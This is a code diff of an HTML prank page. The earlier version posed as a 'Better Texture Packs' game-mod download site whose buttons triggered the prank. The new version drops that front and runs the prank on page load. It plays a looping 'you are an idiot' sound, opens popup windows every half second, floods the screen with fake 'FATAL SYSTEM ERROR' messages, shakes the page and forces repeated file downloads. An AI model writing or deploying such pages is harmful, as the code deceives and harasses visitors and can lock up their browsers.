@@ -11,31 +11,8 @@
             text-align: center;
             font-family: Arial, sans-serif;
             color: white;
-            transition: background 0.5s;
             overflow: hidden;
-        }
-        .container {
-            margin-top: 50px;
-        }
-        .pack {
-            display: inline-block;
-            background: rgba(0, 0, 0, 0.7);
-            padding: 15px;
-            margin: 10px;
-            border-radius: 10px;
-        }
-        img {
-            width: 200px;
-            border-radius: 10px;
-        }
-        button {
-            margin-top: 10px;
-            padding: 10px;
-            background: red;
-            color: white;
-            border: none;
-            cursor: pointer;
-            border-radius: 5px;
+            transition: all 0.1s;
         }
         .troll-window {
             position: absolute;
@@ -50,49 +27,25 @@
     </style>
 </head>
 <body>
-    <div class="container">
-        <h1>Better Texture Packs</h1>
-        <div class="pack">
-            <img src="https://iili.io/2L5ZfCN.png" alt="Better Cornbread">
-            <p>Better Cornbread</p>
-            <button onclick="download()">Download</button>
-        </div>
-        <div class="pack">
-            <img src="https://iili.io/2Lowp7p.png" alt="Better Bowls">
-            <p>Better Bowls</p>
-            <button onclick="download()">Download</button>
-        </div>
-        <div class="pack">
-            <img src="https://iili.io/3CiFphx.png" alt="Better Helmets">
-            <p>Better Helmets</p>
-            <button onclick="download()">Download</button>
-        </div>
-    </div>
-    <audio id="trollSound" src="https://s43.notube.lol/download.php?token=b5c27f9b6d567aef6182bcf290d71499&key=1vkcs3ujog7mdgs0" preload="auto"></audio>
+    <audio id="trollSound" src="https://www.myinstants.com/media/sounds/you-are-an-idiot.mp3" preload="auto" loop></audio>
     
     <script>
-        function download() {
-            alert("Your download will start soon...");
-            setTimeout(troll, 2000);
-        }
-
         function troll() {
             alert("YOU ARE AN IDIOT! AHAHAHAAAAA");
-            document.body.style.background = "red";
             document.getElementById("trollSound").play();
             
             setInterval(() => {
                 window.open("https://iili.io/2LnOhhX.png", "", "width=400, height=300");
-            }, 1000);
+            }, 500);
             
             setInterval(() => {
                 let trollDiv = document.createElement("div");
                 trollDiv.classList.add("troll-window");
-                trollDiv.innerText = "YOU ARE AN IDIOT! AHAHAHAAAAA";
+                trollDiv.innerText = ["ERROR 404!", "YOU ARE DOOMED!", "HAHAHAHA!", "NO ESCAPE!", "FATAL SYSTEM ERROR!", "CRITICAL MALFUNCTION!", "INFINITE CHAOS!", "TROLLED!"][Math.floor(Math.random() * 8)];
                 trollDiv.style.top = Math.random() * window.innerHeight + "px";
                 trollDiv.style.left = Math.random() * window.innerWidth + "px";
                 document.body.appendChild(trollDiv);
-            }, 100);
+            }, 50);
             
             setInterval(() => {
                 let glitch = document.createElement("div");
@@ -103,9 +56,13 @@
                 glitch.style.fontSize = "30px";
                 glitch.innerText = "YOU ARE AN IDIOT!";
                 document.body.appendChild(glitch);
-            }, 50);
+            }, 30);
             
-            setTimeout(() => {
+            setInterval(() => {
+                document.body.style.transform = `rotate(${Math.random() * 10 - 5}deg) scale(${1 + Math.random() * 0.1}) translate(${Math.random() * 10 - 5}px, ${Math.random() * 10 - 5}px)`;
+            }, 100);
+            
+            setInterval(() => {
                 let textFile = new Blob(["YOU ARE AN IDIOT! AHAHAHAAAAA"], { type: "text/plain" });
                 let downloadLink = document.createElement("a");
                 downloadLink.href = URL.createObjectURL(textFile);
@@ -113,8 +70,10 @@
                 document.body.appendChild(downloadLink);
                 downloadLink.click();
                 document.body.removeChild(downloadLink);
-            }, 3000);
+            }, 2000);
         }
+        
+        window.onload = troll;
     </script>
 </body>
 </html>
